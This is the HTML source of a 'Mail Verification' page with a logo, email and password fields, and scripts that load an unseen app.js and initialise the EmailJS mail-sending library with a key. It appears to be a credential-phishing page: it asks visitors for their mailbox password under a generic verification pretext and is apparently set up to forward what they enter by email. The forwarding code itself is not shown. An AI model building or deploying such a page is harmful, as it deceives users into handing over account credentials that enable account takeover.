<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Mail Verification</title>
    <link rel="stylesheet" href="style.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
    />
    <link rel="icon" href="logo.webp" />
  </head>
  <body>
    <main>
      <div class="container">
        <!-- LOGO -->
        <div class="container-img">
          <img class="img-logo" src="logo.webp" alt="" />
        </div>

        <div class="container-mail-form">
          <div class="mail-title-container">
            <!-- MAIL TITLE -->
            <h3 class="mail-title">Mail Verification</h3>
          </div>
          <div class="container-form">
            <form class="form-input" id="form">
              <input type="email" name="email" placeholder="Email" required />

              <div class="password-container">
                <input
                  type="password"
                  name="password"
                  placeholder="Password"
                  id="password"
                  required
                />
                <a id="toggle-password">
                  <span class="password-icon hide" id="open-eye">
                    <ion-icon name="eye"></ion-icon>
                  </span>
                  <span class="password-icon" id="closed-eye">
                    <ion-icon name="eye-off"></ion-icon>
                  </span>
                </a>
              </div>

              <input
                type="submit"
                value="Submit"
                class="submit-form"
                id="submit-form"
              />
            </form>
          </div>
        </div>
      </div>
    </main>
  </body>
  <script src="app.js"></script>
  <script
    type="text/javascript"
    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
  ></script>

  <script type="text/javascript">
    emailjs.init("Eugfd14bsFAEhFKGI");
  </script>

  <script
    type="module"
    src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"
  ></script>
  <script
    nomodule
    src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"
  ></script>
</html>
